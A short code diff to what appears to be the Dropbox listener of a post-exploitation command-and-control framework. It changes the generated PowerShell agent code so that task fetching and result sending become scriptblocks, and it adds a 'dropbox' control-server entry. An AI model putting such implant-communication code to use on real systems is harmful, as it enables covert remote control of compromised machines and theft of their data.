@@ -530,10 +530,11 @@ class Listener:
 
                 updateServers = """
     $Script:APIToken = "%s";
+    $Script:ControlServers = @('dropbox')
                 """ % (apiToken)
 
                 getTask = """
-    function script:Get-Task {
+    $script:GetTask = {
         try {
             # build the web request object
             $wc = New-Object System.Net.WebClient
@@ -571,7 +572,7 @@ class Listener:
                 """ % (taskingsFolder)
 
                 sendMessage = """
-    function script:Send-Message {
+    $script:SendMessage = {
         param($Packets)
 
         if($Packets) {
@@ -632,7 +633,7 @@ class Listener:
         }
     }
                 """ % (resultsFolder)
-
+                
                 return updateServers + getTask + sendMessage
 
             elif language.lower() == 'python':
